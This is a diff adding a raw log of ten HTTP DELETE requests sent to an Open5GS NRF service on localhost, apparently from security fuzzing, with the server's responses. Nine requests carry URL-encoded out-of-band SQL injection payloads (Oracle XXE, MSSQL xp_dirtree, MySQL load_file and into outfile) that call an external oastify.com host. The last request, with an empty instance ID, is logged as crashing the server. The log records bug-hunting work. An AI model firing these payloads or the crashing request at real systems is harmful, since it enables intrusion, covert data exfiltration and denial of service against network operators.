@@ -1,0 +1,209 @@
+
+Request Number 1
+
+DELETE http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}?(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20jydtr%20SYSTEM%20%22http%3a%2f%2f3x1ldn318xl5np35aiyzy3nokfq6qugij6dt3hs.oasti'%7c%7c'fy.com%2f%22%3e%25jydtr%3b]%3e')%2c'%2fl')%20from%20dual)=1
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+
+------------------------------------------------------------
+{'content-length': '140',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:56 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"Not found",
+	"status":	404,
+	"detail":	"{nfInstanceID}",
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 2
+
+DELETE http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}?1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20jydtr%20SYSTEM%20%22http%3a%2f%2fb7jtnvd9i5vdxxddkq878bxwun0e02qqueo1ep3.oasti'%7c%7c'fy.com%2f%22%3e%25jydtr%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'=1
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+
+------------------------------------------------------------
+{'content-length': '140',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:56 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"Not found",
+	"status":	404,
+	"detail":	"{nfInstanceID}",
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 3
+
+DELETE http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}?1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c0fgivklyqu325ml2sfgwg05l2c838ryfp5dz0poe.oasti'%2b'fy.com%5cubu'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+
+------------------------------------------------------------
+{'content-length': '140',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:56 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"Not found",
+	"status":	404,
+	"detail":	"{nfInstanceID}",
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 4
+
+DELETE http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}?1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cowo6c82m7ikqma2q93xkxom9j0prpff36uuohe53.oasti'%2b'fy.com%5cgwh'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+
+------------------------------------------------------------
+{'content-length': '140',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:56 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"Not found",
+	"status":	404,
+	"detail":	"{nfInstanceID}",
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 5
+
+DELETE http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}?1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cgh1yx0nesa5i72niuvicig714saja70vrnfh27qw.oasti'%2b'fy.com%5cpsb'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+
+------------------------------------------------------------
+{'content-length': '140',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:56 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"Not found",
+	"status":	404,
+	"detail":	"{nfInstanceID}",
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 6
+
+DELETE http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}?1')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cvwvdcf2t7pkxmh2x9axrxvmgj7pypmfa63uxhn5c.oasti'%2b'fy.com%5cucz'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+
+------------------------------------------------------------
+{'content-length': '140',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:56 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"Not found",
+	"status":	404,
+	"detail":	"{nfInstanceID}",
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 7
+
+DELETE http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}?(select%20load_file('%5c%5c%5c%5cciyuywoat66e8yoevrj8jc8x5obfb31rstgn3dr2.oastify.com%5c%5ciwz'))=1
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+
+------------------------------------------------------------
+{'content-length': '140',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:56 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"Not found",
+	"status":	404,
+	"detail":	"{nfInstanceID}",
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 8
+
+DELETE http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}?1'%2b(select%20load_file('%5c%5c%5c%5c705pgr65b1o9qt69dm1317qsnjtatyjmapyjl99y.oastify.com%5c%5crhy'))%2b'=1
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+
+------------------------------------------------------------
+{'content-length': '140',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:56 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"Not found",
+	"status":	404,
+	"detail":	"{nfInstanceID}",
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 9
+
+DELETE http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}?1%20into%20outfile%20'%5c%5c%5c%5cr3v9jb9pelrttd9tg64n4rtcq3wuwim6da14oucj.oastify.com%5c%5cuuf'%3b%20--%20=1
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+
+------------------------------------------------------------
+{'content-length': '140',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:56 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"Not found",
+	"status":	404,
+	"detail":	"{nfInstanceID}",
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 10
+
+DELETE http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+
+------------------------------------------------------------
+ ** open5gs crash **
+========================================================================================================================
